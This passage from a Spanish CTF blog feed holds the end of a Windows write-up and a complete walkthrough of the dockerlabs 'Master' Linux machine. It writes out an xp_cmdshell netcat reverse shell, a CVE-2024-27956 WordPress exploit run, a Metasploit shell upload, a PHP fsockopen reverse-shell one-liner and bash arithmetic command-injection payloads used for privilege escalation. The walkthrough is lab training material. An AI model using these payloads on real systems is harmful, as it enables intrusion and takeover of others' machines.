<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>sa  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="se">\\</span>10.0.2.5<span class="se">\m</span>urrusko<span class="se">\n</span>c.exe 10.0.2.5 8888 <span class="nt">-e</span> cmd
</code></pre></div></div>

<p>Conseguimos la shell y vemos que realmente estamos con <strong>nt authority\system</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
listening on <span class="o">[</span>any] 8888 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.145] 49246
Microsoft Windows <span class="o">[</span>Versi?n 10.0.19045.2965]
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. Todos los derechos reservados.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami  
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<p>Ahora solo queda obtener las flags, pero antes solo queda un reto, obtener la flag de root… Os lo dejo a vosotros, como pista buscar <strong>ADS data streams</strong></p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="windows" /><category term="principiante" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Master</title><link href="/posts/master/" rel="alternate" type="text/html" title="Master" /><published>2024-07-01T00:00:00+00:00</published><updated>2024-07-01T00:00:00+00:00</updated><id>/posts/master</id><content type="html" xml:base="/posts/master/"><![CDATA[<p><img src="/assets/images/master/master.png" alt="image" /></p>

<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE
80/tcp open  http
</code></pre></div></div>

<p>Vemos que solo tiene el puerto <strong>80</strong> abierto. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span> <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-favicon: Unknown favicon MD5: CCF3F1622BBC8760E39AAB495FD4A9B1
|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Master
|_http-generator: WordPress 6.5.5
MAC Address: 02:42:AC:11:00:02 <span class="o">(</span>Unknown<span class="o">)</span>
</code></pre></div></div>

<p>Como vemos hay un <strong>wordpress 6.5.5</strong> corriendo. Para escanear el framework usamos la herramienta <code class="language-plaintext highlighter-rouge">wpscan</code>, le pasamos como parametros el target con <code class="language-plaintext highlighter-rouge">—-url</code>, con <code class="language-plaintext highlighter-rouge">-e u,vp,vt</code> le indicamos que nos enumere los usuarios, los plugins vulnerables y los themes vulnerables y que busque los plugins de forma agresiva con <code class="language-plaintext highlighter-rouge">--plugins-detection</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://172.17.0.2 <span class="nt">-e</span> u,vp,vt <span class="nt">--plugins-detection</span> aggressive

...
wp-automatic
 | Location: http://172.17.0.2/wp-content/plugins/wp-automatic/
 | Latest Version: 3.98.0
 | Last Updated: 2024-06-06T01:52:56.000Z
 |
 | Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://172.17.0.2/wp-content/plugins/wp-automatic/, status: 200
 |
 | <span class="o">[!]</span> 7 vulnerabilities identified:
 ....
 
 | <span class="o">[!]</span> Title: Automatic &lt; 3.92.1 - Unauthenticated SQL Injection
 |     Fixed <span class="k">in</span>: 3.92.1
 |     References:
 |      - https://wpscan.com/vulnerability/53a51e79-a216-4ca3-ac2d-57098fd2ebb5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2024-27956
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a8b319be-f312-4d02-840f-e2a91c16b67a
 |
....

 User<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+] mario
 | Found By: Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://172.17.0.2/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Como vemos es vulnerable a <strong>Unauthenticated SQL Injection</strong> con un CVE <strong>CVE-2024-2795</strong>. Descargamos el siguiente exploit de github para explotar la vulnerabilidad:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://raw.githubusercontent.com/diego-tella/CVE-2024-27956-RCE/main/exploit.py
</code></pre></div></div>

<p>Lo ejecutamos y vemos que nos crea un usuario con rol de admistrador:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py http://172.17.0.2
<span class="o">[</span>+] Exploit <span class="k">for </span>CVE-2024-27956
<span class="o">[</span>+] Creating user eviladmin
<span class="o">[</span>+] Giving eviladmin administrator permissions
<span class="o">[</span>+] Exploit completed!
<span class="o">[</span>+] administrator created: eviladmin:admin
</code></pre></div></div>

<p>Ahora para obtener una shell reverse vamos a usar <strong>Metasploit</strong>, lo abrimos con <code class="language-plaintext highlighter-rouge">msfconsole</code>. Después vamos a usar el exploit <strong>wp_admin_shell_upload</strong> que sirve para subir un plugin que genera para que nos de una shell reversa. En este caso voy a usar un payload para que solo me devuelva una shell y no una sesión de meterpreter. Ejecutamos <code class="language-plaintext highlighter-rouge">set payload generic/shell_reverse_tcp</code> :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use exploit/unix/webapp/wp_admin_shell_upload
<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload generic/shell_reverse_tcp 
payload <span class="o">=&gt;</span> generic/shell_reverse_tcp
</code></pre></div></div>

<p>Después vemos las opciones disponibles para que funcione el exploit con <code class="language-plaintext highlighter-rouge">options</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> options

Module options <span class="o">(</span>exploit/unix/webapp/wp_admin_shell_upload<span class="o">)</span>:

   Name       Current Settin  Required  Description
              g
   <span class="nt">----</span>       <span class="nt">--------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   PASSWORD                   <span class="nb">yes       </span>The WordPress passwor
                                        d to authenticate wit
                                        h
   Proxies                    no        A proxy chain of form
                                        at <span class="nb">type</span>:host:port[,ty
                                        pe:host:port][...]
   RHOSTS                     <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, s
                                        ee https://docs.metas
                                        ploit.com/docs/using-
                                        metasploit/basics/usi
                                        ng-metasploit.html
   RPORT      80              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
   SSL        <span class="nb">false           </span>no        Negotiate SSL/TLS <span class="k">for
                                         </span>outgoing connections
   TARGETURI  /               <span class="nb">yes       </span>The base path to the
                                        wordpress application
   USERNAME                   <span class="nb">yes       </span>The WordPress usernam
                                        e to authenticate wit
                                        h
   VHOST                      no        HTTP server virtual h
                                        ost

Payload options <span class="o">(</span>generic/shell_reverse_tcp<span class="o">)</span>:

   Name   Current Setting  Required  Description
   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   LHOST  192.168.1.12     <span class="nb">yes       </span>The listen address <span class="o">(</span>an i
                                     nterface may be specifie
                                     d<span class="o">)</span>
   LPORT  4444             <span class="nb">yes       </span>The listen port

Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   WordPress
</code></pre></div></div>

<p>En nuestro caso cambiamos el <strong>rhost</strong>, la url, el <strong>lhost</strong>, nuestra ip, <strong>username</strong>, el user recien creado, y <strong>password</strong>, su password:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhost http://172.17.0.1
rhost <span class="o">=&gt;</span> http://172.17.0.2
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost docker0
lhost <span class="o">=&gt;</span> 172.17.0.1
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>username eviladmin
username <span class="o">=&gt;</span> eviladmin
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>password admin
password <span class="o">=&gt;</span> admin
</code></pre></div></div>

<p>Lo ejecutamos con <code class="language-plaintext highlighter-rouge">exploit</code> y obtenemos una shell como <strong>www-data</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 172.17.0.1:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating with WordPress using eviladmin:admin...
<span class="o">[</span>+] Authenticated with WordPress
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Preparing payload...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading payload...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing the payload at /wp-content/plugins/YhxOuYmNHi/kMJyYmwgTI.php...
<span class="o">[</span>+] Deleted kMJyYmwgTI.php
<span class="o">[</span>+] Deleted YhxOuYmNHi.php
<span class="o">[</span>+] Deleted ../YhxOuYmNHi
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>172.17.0.1:4444 -&gt; 172.17.0.2:48282<span class="o">)</span> at 2024-07-02 00:43:51 +0200

<span class="nb">whoami
</span>www-data
</code></pre></div></div>

<p>La shell que proporciona metasploit no me gusta mucho, por ello me voy a crear una shell con netcat. Nos ponemos a la escucha en nuestra máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
listening on <span class="o">[</span>any] 8888 ...
</code></pre></div></div>

<p>Ejecutamos el siguiente payload para que genere la shell reversa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php <span class="nt">-r</span> <span class="s1">'$sock=fsockopen("172.17.0.1",8888);exec("/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
</code></pre></div></div>

<p>Y para terminar hacemos el tratamiento de la shell para tener una TTY completa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 8888
listening on <span class="o">[</span>any] 8888 ...
connect to <span class="o">[</span>172.17.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.17.0.2] 55124
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
script /dev/null <span class="nt">-qc</span> /bin/bash
sh: 0: getcwd<span class="o">()</span> failed: No such file or directory
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@28f7a25fdecd:<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-nlvp</span> 8888
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 8888
<span class="nb">ls
</span>www-data@28f7a25fdecd:<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
www-data@28f7a25fdecd:<span class="nv">$ </span>reset
</code></pre></div></div>

<p>Ahora ya en nuestra máquina vemos con <code class="language-plaintext highlighter-rouge">sudo -l</code> si podríamos ejecutar algo como otro usuario:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>www-data on 28f7a25fdecd:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
    use_pty

User www-data may run the following commands on 28f7a25fdecd:
    <span class="o">(</span>pylon<span class="o">)</span> NOPASSWD: /usr/bin/php
</code></pre></div></div>

<h1 id="movimientos-laterales">Movimientos laterales</h1>

<p>Podríamos ejecutar como <strong>pylon</strong> el comando <code class="language-plaintext highlighter-rouge">php</code> sin necesidad de contraseña. Vamos a <a href="https://gtfobins.github.io/gtfobins/php/#sudo">GTFOBins</a> y encontramos como ejecutarlo con <strong>sudo</strong> para hacer el movimiento lateral</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@28f7a25fdecd:<span class="nv">$ CMD</span><span class="o">=</span><span class="s2">"/bin/bash"</span>
www-data@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> pylon php <span class="nt">-r</span> <span class="s2">"system('</span><span class="nv">$CMD</span><span class="s2">');"</span>
pylon@28f7a25fdecd:<span class="nv">$ </span><span class="nb">whoami
</span>pylon
</code></pre></div></div>

<p>Ya estamos como <strong>pylon</strong>. Ahora volvemos a mirar si podemos ejecutar algo como otro usuario:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pylon@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>pylon on 28f7a25fdecd:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User pylon may run the following commands on 28f7a25fdecd:
    <span class="o">(</span>mario<span class="o">)</span> NOPASSWD: /bin/bash /home/mario/pingusorpresita.sh
</code></pre></div></div>

<p>Como explico Mario en este <a href="https://youtube.com/shorts/30Z2QVJfhGs?feature=shared">short</a> en su canal de YouTube vamos a movernos al usuario mario usando esa técnica:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pylon@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> mario /bin/bash /home/mario/pingusorpresita.sh
Escribe 1 para ver el canal del pinguino, o cualquier otro numero para acceder a la academia: a[<span class="si">$(</span><span class="nb">whoami</span> <span class="o">&gt;</span>&amp;2<span class="si">)</span><span class="o">]</span>+1
mario
https://www.youtube.com/@ElPinguinoDeMario

<span class="c"># Funciona! Ahora ejecutamos una shell en bash</span>
pylon@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> mario /bin/bash /home/mario/pingusorpresita.sh
Escribe 1 para ver el canal del pinguino, o cualquier otro numero para acceder a la academia: a[<span class="si">$(</span>bash  <span class="o">&gt;</span>&amp;2<span class="si">)</span><span class="o">]</span>+1
mario@28f7a25fdecd:~<span class="nv">$ </span><span class="nb">whoami
</span>mario
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Una vez estamos como mario hacemos el mismo proceso para convertirnos en root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@28f7a25fdecd:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>mario on 28f7a25fdecd:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
    use_pty

User mario may run the following commands on 28f7a25fdecd:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/bash /home/pylon/pylonsorpresita.sh
    
mario@28f7a25fdecd:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/bash /home/pylon/pylonsorpresit/bin/bash /home/pylon/pylonsorpresita.sh
Escribe 1 para ver el canal de pylon: a[<span class="si">$(</span>bash  <span class="o">&gt;</span>&amp;2<span class="si">)</span><span class="o">]</span>+1
root@28f7a25fdecd:/home/mario# <span class="nb">cd</span> ~
root@28f7a25fdecd:~# <span class="nb">hostname</span><span class="p">;</span> <span class="nb">whoami
</span>28f7a25fdecd
root
root@28f7a25fdecd:~# 
</code></pre></div></div>

<p>Y con este terminamos la máquina.</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="medio" /><summary type="html"><![CDATA[]]></summary></entry></feed>